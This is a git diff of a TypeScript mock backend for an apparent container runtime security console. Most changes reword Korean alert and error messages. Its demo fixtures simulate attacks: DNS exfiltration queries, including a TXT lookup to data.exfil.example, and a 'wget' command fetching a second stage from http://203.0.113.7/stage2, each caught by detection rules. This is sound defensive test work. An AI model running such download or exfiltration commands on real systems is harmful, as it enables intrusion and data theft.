@@ -82,7 +82,7 @@ export function dnsVerdict(container: string, o: { name?: string; qtype?: string
   const name = o.name ?? DNS_EXFIL_NAME;
   const qtype = o.qtype ?? 'A';
   const e = dnsEvent(Date.now(), 0, container, 'demo/x:1', name, qtype);
-  const reason = o.reason ?? (qtype === 'TXT' ? `금지 질의 유형: ${qtype} — ${name}` : `긴 DNS 라벨(유출 의심): ${name} (라벨 48자 > 40)`);
+  const reason = o.reason ?? (qtype === 'TXT' ? `금지 질의 유형: ${name} (${qtype})` : `긴 DNS 라벨(유출 의심): ${name} (라벨 48자 > 40)`);
   if (o.action === 'kill') return { ...kill(e, o.ruleId ?? 'sandbox-dns', reason), enforced: !o.dryRun, dryRun: !!o.dryRun };
   return alert(e, o.ruleId ?? 'runtime-dns-exfil', reason);
 }
@@ -143,12 +143,12 @@ export function validateSequence(r: Rule): string[] {
   if (n < 2 || n > 5) errs.push(`steps: 단계 2~5개 (지금 ${n}개)`);
   const w = r.windowSeconds ?? 0;
   if (w < 1 || w > 60) errs.push(`windowSeconds ${w}: 1~60`);
-  if (hasCond(r as unknown as Record<string, unknown>)) errs.push('sequence 규칙 최상위에는 조건을 쓸 수 없음 — 조건은 steps 에');
+  if (hasCond(r as unknown as Record<string, unknown>)) errs.push('sequence 규칙 최상위에는 조건을 쓸 수 없음(조건은 steps 에)');
   (r.steps ?? []).forEach((st, i) => {
     const s = st as unknown as Record<string, unknown>;
     if (!['exec', 'open', 'connect', 'dns'].includes(String(s.kind))) return void errs.push(`steps[${i}]: kind ${JSON.stringify(s.kind ?? '')}: exec | open | connect | dns`);
     if (['id', 'description', 'action', 'dryRun', 'disabled', 'containers', 'steps', 'windowSeconds'].some((k) => s[k] !== undefined))
-      errs.push(`steps[${i}]: 단계에는 kind 와 조건만 — id · description · action · dryRun · disabled · containers · steps · windowSeconds 는 쓸 수 없음`);
+      errs.push(`steps[${i}]: 단계에는 kind 와 조건만 쓸 수 있음(id · description · action · dryRun · disabled · containers · steps · windowSeconds 는 쓸 수 없음)`);
     if (!hasCond(s)) errs.push(`steps[${i}]: ${String(s.kind)} 규칙에 조건이 없음`);
   });
   return errs;
@@ -489,7 +489,7 @@ export class MockBackend {
     const RTIMG = 'demo/reqeusts:1.0.2';
     const rt: Verdict[] = [
       alert(dnsEvent(now, 57, RT, RTIMG, DNS_EXFIL_NAME, 'A'), 'runtime-dns-exfil', `긴 DNS 라벨(유출 의심): ${DNS_EXFIL_NAME} (라벨 48자 > 40)`),
-      alert(dnsEvent(now, 57, RT, RTIMG, 'data.exfil.example', 'TXT'), 'runtime-dns-exfil', '금지 질의 유형: TXT — data.exfil.example'),
+      alert(dnsEvent(now, 57, RT, RTIMG, 'data.exfil.example', 'TXT'), 'runtime-dns-exfil', '금지 질의 유형: data.exfil.example (TXT)'),
     ];
     this.recent.unshift(...rt);
     const top = Math.max(0, ...this.audit.map((a) => a.id));
@@ -637,7 +637,7 @@ export class MockBackend {
       ],
       'dns-exfil': [
         () => alert(e({ kind: 'dns', comm: 'python3', dstHost: DNS_EXFIL_NAME, qtype: 'A', dstIp: '127.0.0.11', dstPort: 53 }), 'runtime-dns-exfil', `긴 DNS 라벨(유출 의심): ${DNS_EXFIL_NAME} (라벨 48자 > 40)`),
-        () => alert(e({ kind: 'dns', comm: 'python3', dstHost: 'data.exfil.example', qtype: 'TXT', dstIp: '127.0.0.11', dstPort: 53 }), 'runtime-dns-exfil', '금지 질의 유형: TXT — data.exfil.example'),
+        () => alert(e({ kind: 'dns', comm: 'python3', dstHost: 'data.exfil.example', qtype: 'TXT', dstIp: '127.0.0.11', dstPort: 53 }), 'runtime-dns-exfil', '금지 질의 유형: data.exfil.example (TXT)'),
       ],
       benign: [], // 11/04: 정상 대조군 — 위반 없음
       chain: [() => kill(e({ kind: 'exec', comm: 'wget', args: 'wget -q -O /dev/null http://203.0.113.7/stage2' }), 'no-shell-download', '금지 프로세스 실행: wget')], // 11/04: 기본 정책은 1단계에서 격리
@@ -785,7 +785,7 @@ export class MockBackend {
     }
     const json = (data: unknown, status = 200) => route.fulfill({ status, contentType: 'application/json', body: JSON.stringify(data) });
     const fail = (status: number, error: string) => json({ error }, status);
-    if (this.failing.has(path)) return fail(this.failing.get(path)!, '모의 오류 — 서버가 응답하지 않습니다');
+    if (this.failing.has(path)) return fail(this.failing.get(path)!, '모의 오류(서버가 응답하지 않습니다)');
     const q = url.searchParams;
     // 읽기 전용 POST(미리보기 · AI 도우미 질문)는 조회자도 부른다 — 백엔드 ViewerWritePatterns
     const writing = method !== 'GET' && !path.endsWith('/preview') && path !== '/chat';
@@ -904,7 +904,7 @@ export class MockBackend {
       }
       const extra = Object.keys(inp).find((k) => k !== 'changeId' && k !== 'reason');
       if (extra) return fail(400, `JSON 형식 오류: json: unknown field "${extra}"`);
-      if (id === 'blocklist-hosts') return fail(409, 'blocklist-hosts 는 차단 목록에서 관리하는 시스템 규칙 — 차단 목록(/api/blocklist)에서 바꾼다');
+      if (id === 'blocklist-hosts') return fail(409, 'blocklist-hosts 는 차단 목록에서 관리하는 시스템 규칙, 차단 목록(/api/blocklist)에서 바꾼다');
       const reason = (inp.reason ?? '').trim();
       if (!reason) return fail(400, 'reason: 되돌리는 사유가 필요함');
       if (!inp.changeId) return fail(400, 'changeId 가 필요함');
@@ -912,7 +912,7 @@ export class MockBackend {
       if (!src) return fail(404, '변경 기록 없음');
       if (!(src.ruleIds ?? []).includes(id)) return fail(404, `정책 ${id} 의 변경 기록이 아님`);
       const restored = src.before?.[id];
-      if (!restored) return fail(409, src.after?.[id] ? `이 변경 전에는 정책 ${id} 없음(새로 만든 기록) — 지우려면 정책 삭제 사용` : `이 변경에는 정책 ${id} 의 변경 전 값 없음`);
+      if (!restored) return fail(409, src.after?.[id] ? `이 변경 전에는 정책 ${id} 없음(새로 만든 기록), 지우려면 정책 삭제 사용` : `이 변경에는 정책 ${id} 의 변경 전 값 없음`);
       const i = this.rules.findIndex((x) => x.id === id);
       const cur = i >= 0 ? clone(this.rules[i]) : undefined;
       if (cur && sameRule(cur, restored)) return fail(409, `정책 ${id}: 이미 그 변경 전 값과 같음`);
@@ -1042,7 +1042,7 @@ export class MockBackend {
         this.addChange('proposal_applied', this.changeSummary(p), c.id, p.id, reason, { ruleIds: [...ids].sort(), ...(Object.keys(before).length ? { before, after } : {}) });
       } else {
         Object.assign(p, { state: 'discarded' });
-        this.addChange('proposal_discarded', `제안 ${p.id} 버림 — 변경 없이 건 종결`, c.id, p.id, reason);
+        this.addChange('proposal_discarded', '제안 버림(변경 없이 건 종결)', c.id, p.id, reason);
       }
       Object.assign(c, { state: 'closed', closedAt: at });
       this.send({ type: 'case', data: { ...c } });
@@ -1105,7 +1105,7 @@ export class MockBackend {
       ['token', `${open.length}개 있습니다. `],
       ['token', '각 건을 열어 판정하세요.'],
       ['facts', { intent: 'pending', tool: 'pending_cases', status: `판정 대기 ${open.length}건`, sentences: open.map((c) => `${c.label} 은 판정 대기입니다.`), cases: [] }],
-      ['links', [{ label: '감사 로그 — 판정 · 변경 이력', href: '/audit?view=changes' }]],
+      ['links', [{ label: '감사 로그(판정 · 변경 이력)', href: '/audit?view=changes' }]],
       ['done', {}],
     ];
   }
@@ -1274,10 +1274,10 @@ export class MockBackend {
         effects.push({ kind: 'blocklist', count: fresh.length, text: `차단 목록 +${fresh.length} (${by.join(' · ')})` });
       }
       if (already.length) effects.push({ kind: 'already_blocked', count: already.length, text: `이미 차단 목록에 있는 ${already.length}개(${already.map((x) => `${label[x.list]} ${x.value}`).join(', ')})는 그대로 둡니다` });
-      if (!fresh.length) effects.push({ kind: 'none', text: '새로 차단할 대상이 없습니다 — 적용하면 건만 종결합니다' });
+      if (!fresh.length) effects.push({ kind: 'none', text: '새로 차단할 대상이 없습니다. 적용하면 건만 종결합니다' });
       for (const x of fresh) {
         if (x.list === 'packages') effects.push({ kind: 'package', text: `다음 sg-install 부터 ${x.value} 는 설치 전에 거부됩니다(컨테이너를 띄우지 않음)` });
-        if (x.list === 'images') effects.push({ kind: 'image', count: 1, text: `같은 이미지(${x.value})를 쓰는 실행 중 컨테이너 1개 — 적용하면 다음 시작 때 격리됩니다(지금 실행은 그대로)` });
+        if (x.list === 'images') effects.push({ kind: 'image', count: 1, text: `같은 이미지(${x.value})를 쓰는 실행 중 컨테이너 1개, 적용하면 다음 시작 때 격리됩니다(지금 실행은 그대로)` });
       }
       const hosts = fresh.filter((x) => x.list === 'hosts').map((x) => x.value);
       if (hosts.length) effects.push({ kind: 'host', count: hosts.length, text: `도메인 ${hosts.length}개(${hosts.join(', ')})는 적용 즉시 시스템 규칙 blocklist-hosts 로 차단됩니다(런타임 · 설치 모두)` });
@@ -1285,12 +1285,12 @@ export class MockBackend {
       const ex = changes.filter((x): x is Extract<ProposalChange, { op: 'except' }> => x.op === 'except');
       for (const x of ex) {
         const r = this.rules.find((y) => y.id === x.ruleId);
-        effects.push({ kind: 'exception', text: `규칙 ${x.ruleId} 예외 추가 — ${x.field} 에 ${x.value} (범위: ${r?.containers?.length ? `컨테이너 ${r.containers.join(', ')}` : '모든 컨테이너'}). 적용 즉시 엔진에 반영됩니다` });
+        effects.push({ kind: 'exception', text: `규칙 ${x.ruleId} 예외 추가(${x.field} 에 ${x.value}, 범위: ${r?.containers?.length ? `컨테이너 ${r.containers.join(', ')}` : '모든 컨테이너'}). 적용 즉시 엔진에 반영됩니다` });
       }
-      if (!ex.length) effects.push({ kind: 'none', text: '자동으로 만들 예외가 없습니다 — 정책 탭에서 직접 고칩니다' });
+      if (!ex.length) effects.push({ kind: 'none', text: '자동으로 만들 예외가 없습니다. 정책 탭에서 직접 고칩니다' });
     }
     for (const n of notes) effects.push({ kind: 'note', text: n });
-    effects.push({ kind: 'next', text: '판정하면 제안 초안이 생깁니다 — 아직 아무것도 바뀌지 않으며, 정책 화면에서 미리보기 후 적용합니다' });
+    effects.push({ kind: 'next', text: '판정하면 제안 초안이 생깁니다. 아직 아무것도 바뀌지 않으며, 정책 화면에서 미리보기 후 적용합니다' });
     return { caseId: c.id, decision, changes, notes, effects };
   }
 
@@ -1332,14 +1332,14 @@ export class MockBackend {
         if (!v.ruleId) continue;
         const rule = this.rules.find((r) => r.id === v.ruleId);
         if (v.ruleId === 'blocked-image') note('이미지 차단은 예외가 아니라 차단 목록에서 해제합니다');
-        else if (rule?.kind === 'exec') note(`실행 규칙 ${v.ruleId} 은 자동 예외를 만들지 않습니다 — 정책 탭에서 직접 수정하세요`);
+        else if (rule?.kind === 'exec') note(`실행 규칙 ${v.ruleId} 은 자동 예외를 만들지 않습니다. 정책 탭에서 직접 수정하세요`);
         // 엔진은 금지 목록(denyPorts · denyHosts)을 허용 목록보다 먼저 본다 — 예외로 풀 수 없으면 안내만
         else if (v.event.kind === 'connect' && (rule?.denyPorts?.includes(v.event.dstPort ?? -1) || rule?.denyHosts?.some((h) => v.event.dstHost && hostMatches(h, v.event.dstHost))))
-          note(`규칙 ${v.ruleId} 은 금지 목록에 걸려 예외로 풀 수 없습니다 — 정책 탭에서 직접 수정하세요`);
+          note(`규칙 ${v.ruleId} 은 금지 목록에 걸려 예외로 풀 수 없습니다. 정책 탭에서 직접 수정하세요`);
         else if (v.event.kind === 'open' && v.event.path) add({ op: 'except', ruleId: v.ruleId, field: 'allowPaths', value: v.event.path });
         // 10/30: dns 규칙은 허용 도메인 목록이 있을 때만 예외(없는 규칙에 첫 allowHosts 를 넣으면 허용 목록 모드로 바뀐다)
         else if (v.event.kind === 'dns' && v.event.dstHost && hadHosts.has(v.ruleId)) add({ op: 'except', ruleId: v.ruleId, field: 'allowHosts', value: v.event.dstHost });
-        else if (v.event.kind === 'dns') note(`규칙 ${v.ruleId} 은 허용 도메인 목록이 없어 자동 예외를 만들지 않습니다 — 정책 탭에서 직접 수정하세요`);
+        else if (v.event.kind === 'dns') note(`dns 규칙 ${v.ruleId} 은 허용 목록이 없어 자동 예외를 만들지 않습니다(allowHosts 를 넣으면 그 밖의 도메인 질의가 모두 위반이 됩니다). 정책 탭에서 직접 수정하세요`);
         else if (v.event.kind === 'connect' && v.event.dstHost && hadHosts.has(v.ruleId)) add({ op: 'except', ruleId: v.ruleId, field: 'allowHosts', value: v.event.dstHost });
         else if (v.event.kind === 'connect') add({ op: 'except', ruleId: v.ruleId, field: 'allowCidrs', value: `${v.event.dstIp}/32` });
       }
